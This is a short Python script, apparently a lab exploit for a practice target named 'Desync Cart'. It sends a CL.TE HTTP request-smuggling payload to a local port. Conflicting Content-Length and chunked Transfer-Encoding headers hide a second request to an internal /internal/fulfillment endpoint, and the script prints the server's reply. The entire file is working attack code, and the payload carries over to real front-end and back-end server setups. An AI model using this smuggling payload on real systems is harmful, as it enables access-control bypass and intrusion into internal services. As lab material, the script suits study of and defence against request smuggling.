#!/usr/bin/env python3
"""Controlled local CL.TE replay for Desync Cart. Target is always localhost:8080."""
import argparse, socket

parser = argparse.ArgumentParser(); parser.add_argument("--port", type=int, default=8080); args = parser.parse_args()

wire = (b"POST / HTTP/1.1\r\nHost: desync-commerce\r\nContent-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
        b"0\r\n\r\nGET /internal/fulfillment HTTP/1.1\r\n"
        b"Host: desync-commerce\r\nConnection: close\r\n\r\n")

with socket.create_connection(("127.0.0.1", args.port), timeout=3) as sock:
    sock.sendall(wire); sock.settimeout(3); output = b""
    try:
        while True:
            part = sock.recv(8192)
            if not part: break
            output += part
    except socket.timeout: pass
print(output.decode("latin1", "replace"))
